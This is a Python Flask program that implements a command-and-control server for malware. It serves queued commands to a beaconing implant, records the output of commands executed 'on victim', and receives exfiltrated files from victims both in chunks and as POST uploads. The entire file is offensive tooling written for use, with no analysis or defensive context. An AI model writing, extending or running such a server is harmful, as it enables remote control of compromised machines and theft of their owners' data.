import requests
from flask import Flask, request
import yaml
import netifaces as ni
import time
app = Flask(__name__)
#app.config['MAX_CONTENT_LENGTH'] = 16 * 1000 * 1000 # this defult max file size for upload
time_stamp = time.strftime("%d-%m-%Y-%H-%M-%S")
@app.route("/beacon", methods=["GET"])
def beacon():
      with open("commands.yaml", "r") as cmd_stream:
        try:

            return yaml.safe_load(cmd_stream)

        except yaml.YAMLError as exc:
            print(exc)
      cmd_stream.close()

@app.route("/reply_command", methods=["POST"])
def reply_command():
    """
    open a file and save all outputs regarding executing a command on victim in right format
    as we used utf8 in both sides + using header in sender side
    :return:
    """
    data = request.data
    with open('received_command_results.txt', 'w') as victim_info:
        try:
            victim_info.write(data.decode("utf-8"))
        except IOError:
            print('Can not write')
    victim_info.close()
    return "Command sent successfully." # we will get error 500 if we return nothing

@app.route("/send_file", methods=["POST"])
def send_file():
    """
    :return:
    """
    time_stamp = time.strftime("%d-%m-%Y-%H-%M-%S")
    #chunks = {}
    chunk_number = int(request.headers.get("X-Chunk-Number"))
    total_chunks = int(request.headers.get("X-Total-Chunks"))
    file_name = request.headers.get("X-File-Name")
    #chunk_data = request.data
	
    chunk_data = request.data

    # Append the received chunk to the file
    with open('exfiltrated_'+file_name, "ab") as file:
        file.write(chunk_data)

    if chunk_number == total_chunks - 1:
        file.close()
        return "File upload complete"

    return "Chunk "+str(chunk_number)+ "/"+str(total_chunks)+ " received"

@app.route("/send_file_by_post", methods=["POST"])
def send_file_by_post():
    """
    Default max file size to upload to flask is 16mb if bigger then
    it get error
    """
    try:
        # Get the uploaded file from the request
        uploaded_file = request.files['exfil_file']

        # Specify the path where you want to save the uploaded file
        save_path = 'victim/'  # You can customize this path

        # Save the file to the server
        uploaded_file.save(f"{save_path}{uploaded_file.filename}")

        return "File uploaded successfully!", 200
    except Exception as e:
        return str(e), 500


if __name__ == "__main__":

    ip = ni.ifaddresses('ens19')[ni.AF_INET][0]['addr']
    app.run(host= str(ip), port=8080)
